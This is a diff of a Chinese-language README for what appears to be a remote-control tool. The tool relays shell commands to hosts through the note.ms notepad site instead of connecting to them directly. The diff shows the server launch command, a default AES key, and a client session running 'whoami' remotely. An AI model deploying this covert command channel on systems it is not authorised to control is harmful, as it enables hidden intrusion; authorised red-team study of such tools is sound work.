@@ -48,68 +48,48 @@
 
 
 
-## 0x03工具利用
+工具利用
 
-`client`为控制端 
-
-`server`为被控端
-
-### 被控端 `server`
-
-被控端运行以下命令：
-
-```bash
+被控端 server
+被控端运行以下命令：‍
 ./server --key notekey --admin ocis
-```
+![图片](https://user-images.githubusercontent.com/85468097/235076901-cd23d80f-2799-440e-bf66-ec21be4223e3.png)
 
-其中有两个参数，为了提高安全性，建议修改这两个参数：
+其中有两个参数，为了提高安全性，建议都修改一下：
 
-- `key`：为AES加密的密钥，可自定义密钥。默认密钥为`zhu1234554321zhu`
-- `admin`：控制的uri地址，默认为`ocis`
+key：为AES加密的密钥，可自定义密钥，默认密钥为zhu1234554321zhu
+admin：控制的uri地址，默认为ocis
 
-### 控制端 `client`
 
-#### 1.控制端刷新在线主机列表
-
-```
+控制端 client
+1. 控制端刷新在线主机列表
 username$ ./client
 0:主机名:[penetration]  note地址:[BpLnfgDsc3WD9F3qNfHK6a95jjJkwz]       notekey地址:[zhu1234554321zhu]
 
-
 1.获取在线主机列表(不一定全)
 2.执行主机命令(需要等待30秒)
 3.更新别控端列表(需等待30秒)
-```
-
-#### 2.控制端执行命令
 
 
+2. 控制端执行命令
 
-```
 username$ ./client
 1.获取在线主机列表(不一定全)
 2.执行主机命令(需要等待30秒)
 3.更新别控端列表(需等待30秒)
 
-
 2
 请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
 请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
 请输入shell命令:whoami
 请等待30秒
 jpass
-1.获取在线主机列表(不一定全)
-2.执行主机命令(需要等待30秒)
-3.更新别控端列表(需等待30秒)
+![图片](https://user-images.githubusercontent.com/85468097/235076858-840b5831-4638-4e55-9cb0-82fc0628ef85.png)
 
 
-2
-请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
-请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
-请输入shell命令:whoami
-请等待30秒
-jpass
-```
+这里可以看到目标主机是与note.ms建立的连接，而不是与控制端直接进行连接的。
+
+![图片](https://user-images.githubusercontent.com/85468097/235076866-e8dca6e0-5098-429a-a98a-8eee9c47f201.png)
 
 ## 0x04工具信息
 
